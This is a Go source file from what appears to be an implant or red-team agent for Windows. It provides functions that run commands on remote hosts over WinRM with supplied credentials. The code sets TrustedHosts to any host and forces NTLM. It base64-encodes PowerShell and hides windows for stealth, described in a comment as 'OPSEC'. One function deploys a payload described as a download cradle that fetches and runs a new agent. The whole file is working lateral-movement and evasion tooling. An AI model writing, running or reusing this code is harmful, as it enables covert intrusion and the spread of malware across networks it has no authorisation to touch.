//go:build windows

package agent

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"unicode/utf16"
)

// utf16LEBase64 encodes s as a UTF-16LE byte sequence and returns its
// standard base64 representation, which PowerShell -EncodedCommand expects.
func utf16LEBase64(s string) string {
	runes := utf16.Encode([]rune(s))
	buf := make([]byte, len(runes)*2)
	for i, r := range runes {
		binary.LittleEndian.PutUint16(buf[i*2:], r)
	}
	return base64.StdEncoding.EncodeToString(buf)
}

// winrmExec executes cmd on a remote Windows host using PowerShell Invoke-Command
// over WinRM/PSRemoting. Credentials are passed via a PSCredential object and the
// command is base64-encoded to keep it off the process command line (OPSEC).
// Resolves target to IPv4 first so NTLM is used (Kerberos rejects local accounts).
func winrmExec(target, user, pass, cmd string) (string, error) {
	// Build the PowerShell script that wraps Invoke-Command.
	// The inner command is itself encoded to avoid quoting hell.
	innerB64 := utf16LEBase64(cmd)
	script := fmt.Sprintf(`
Set-Item WSMan:\localhost\Client\TrustedHosts -Value * -Force -EA SilentlyContinue
try{$ip=[System.Net.Dns]::GetHostAddresses('%s')[0].IPAddressToString}catch{$ip='%s'}
$pw = ConvertTo-SecureString -String '%s' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('%s', $pw)
try {
    Invoke-Command -ComputerName $ip -Credential $cred -ScriptBlock {
        try { powershell -NonInteractive -EncodedCommand %s } catch { $_.Exception.Message }
    } | Out-String -Width 256
} catch { $_.Exception.Message }
`, escapePS(target), escapePS(target), escapePS(pass), escapePS(user), innerB64)

	encoded := utf16LEBase64(script)
	out, err := runShell(fmt.Sprintf(
		"powershell -NonInteractive -WindowStyle Hidden -EncodedCommand %s", encoded,
	))
	if err != nil {
		return out, fmt.Errorf("winrmExec %s: %w", target, err)
	}
	return out, nil
}

// winrmDeploy runs a PowerShell payload on a remote host via WinRM.
// payload is typically a download cradle that fetches and executes a new agent.
// Resolves target to IPv4 first so NTLM is used (Kerberos rejects local accounts).
func winrmDeploy(target, user, pass, payload string) (string, error) {
	// Encode the payload so it survives quoting inside Invoke-Command.
	payloadB64 := utf16LEBase64(payload)
	script := fmt.Sprintf(`
Set-Item WSMan:\localhost\Client\TrustedHosts -Value * -Force -EA SilentlyContinue
try{$ip=[System.Net.Dns]::GetHostAddresses('%s')[0].IPAddressToString}catch{$ip='%s'}
$pw = ConvertTo-SecureString -String '%s' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('%s', $pw)
Invoke-Command -ComputerName $ip -Credential $cred -AsJob -ScriptBlock {
    powershell -NonInteractive -WindowStyle Hidden -EncodedCommand %s
} | Out-Null
`, escapePS(target), escapePS(target), escapePS(pass), escapePS(user), payloadB64)

	encoded := utf16LEBase64(script)
	out, err := runShell(fmt.Sprintf(
		"powershell -NonInteractive -WindowStyle Hidden -EncodedCommand %s", encoded,
	))
	if err != nil {
		return out, fmt.Errorf("winrmDeploy %s: %w", target, err)
	}
	return out, nil
}

// escapePS escapes a string for safe embedding inside a PowerShell single-quoted
// string literal by doubling any single-quote characters.
func escapePS(s string) string {
	out := make([]byte, 0, len(s)+4)
	for i := 0; i < len(s); i++ {
		if s[i] == '\'' {
			out = append(out, '\'', '\'')
		} else {
			out = append(out, s[i])
		}
	}
	return string(out)
}
